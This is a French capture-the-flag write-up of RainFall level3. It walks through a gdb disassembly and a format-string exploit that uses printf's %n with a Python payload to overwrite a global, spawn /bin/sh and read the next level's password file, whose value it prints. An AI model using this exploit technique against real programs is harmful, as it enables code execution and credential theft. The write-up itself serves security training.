    __               _______
   / /__ _   _____  / /__  /
  / / _ \ | / / _ \/ / /_ < 
 / /  __/ |/ /  __/ /___/ / 
/_/\___/|___/\___/_//____/  
                            
                           
On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. 

level3@RainFall:~$ ./level3
AAAA
AAAA

Again …

En désassemblant le binaire sur gdb on peut voir que le <main> fait appel à une fonction <v>. On parcours <v> celle ci utilise la fonction fgets().
L’utilisation de fgets() à la place de gets() complique la tâche de réalisation d’un buffer overflow : 

“The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the calling program to reliably determine 
the length of the next incoming line, the use of this function enables malicious users to arbitrarily change a running program's functionality through a 
buffer overflow attack.  It is strongly suggested that the fgets() function be used in all cases.”

char *fgets(char *restrict str, int size,FILE * restrict stream);

>$ (gdb) disas v

0x080484ad <+9>:	mov    0x8049860,%eax                   (1) restrict stream : 0x8049860=STDIN
0x080484b2 <+14>:	mov    %eax,0x8(%esp)				
0x080484b6 <+18>:	movl   $0x200,0x4(%esp)                 (2) size
0x080484be <+26>:	lea    -0x208(%ebp),%eax                (3) restrict str (notre input)
0x080484c4 <+32>:	mov    %eax,(%esp) 
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>	        (4) appel fgets avec les arguments (1), (2) & (3)
0x080484cc <+40>:	lea    -0x208(%ebp),%eax
0x080484d2 <+46>:	mov    %eax,(%esp)			(5) push notre input en argument pour printf	        	        	        
0x080484d5 <+49>:	call   0x8048390 <printf@plt> 	        (6) appel printf qui nous affiche notre input
0x080484da <+54>:	mov    0x804988c,%eax			  (7) eax qui devrait contenir le retour de printf (le nombres caractères affichés) est écrasé 
                                                                par 804988c qui est une chaine vide
0x080484df <+59>:	cmp    $0x40,%eax			(8) eax est ensuite comparé à 0x40 ou 64 en décimale
0x080484e2 <+62>:	jne    0x8048518 <v+116>		        (9) 		
0x0804850c <+104>:	movl   $0x804860d,(%esp)		        (10a) si eax == 0x40 alors on abouti sur le shell /bin/sh 
0x08048513 <+111>:	call   0x80483c0 <system@plt>	              $0x804860d étant “/bin/sh”
   
0x08048518 <+116>:	leave						            (10b) si eax != 0x40 alors on quitte la fonction
0x08048519 <+117>:	ret

La question est donc : comment réécrire le contenu de 0x804988c avec “0x40” ?

On peut remarquer cependant la présence de printf() qui est une source importantes d'exploitations type format strings.

Afin de mener à bien cet exploit. Il nous faut :
 
    1. Lire dans la memoire

Ajoutons à notre input un format specifiers “%x” :

level3@RainFall:~$ ./level3
AAAA%x
AAAA200

printf() n’ayant aucune n’argument auquel référer “%x” nous affiche ce qu’il trouve sur la stack. 

    2. Localiser le buffer de printf() dans la memoire

Ajoutons progressivement des format specifier “%x” :

level3@RainFall:~$ python -c "print 'AAAA %x %x %x %x'" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141

On retrouve notre buffer “41414141”. 

level3@RainFall:~$ python -c "print 'AAAA %4\$x'" | ./level3
AAAA 41414141

On peut aussi préciser explicitement quel argument prendre, en écrivant, à chaque conversion, « %m$ » […] l’ entier décimal m indique la position dans la liste
d'arguments (ici notre stack).

    3.  Injectez notre adresse 0x804988c dans le buffer de printf()

level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 804988c

OU 

level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'+'%4\$x'" | ./level3
�804988c

Success ! On retrouve bien 804988c à la position “%4$x”

    4. Ecrire dans 0x804988

Nous allons utiliser le format specifier “%n“ qui saisis le nombre de caractères qui ont été écrits avec succès avant l’occurence de “%n” dans le flux ou 
la mémoire tampon. Cette valeur est stockée dans l'entier dont l'adresse est donnée en argument. Or l’argument ici est situé à une position que nous avons 
déterminée (2) et remplacée par l’adresse souhaitée “0x804988”(3). 

Il nous faut donc 64 (0x40) caractères avant “%n” afin de passer la comparaison

0x080484df <+59>:	cmp    $0x40,%eax	

********************************************************************************************************************

#!/usr/bin/env python

address="\x8c\x98\x04\x08"

payload=address+(60*"A")+"%4$n"

print payload

********************************************************************************************************************

level3@RainFall:~$ cat exploit - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa


Next …
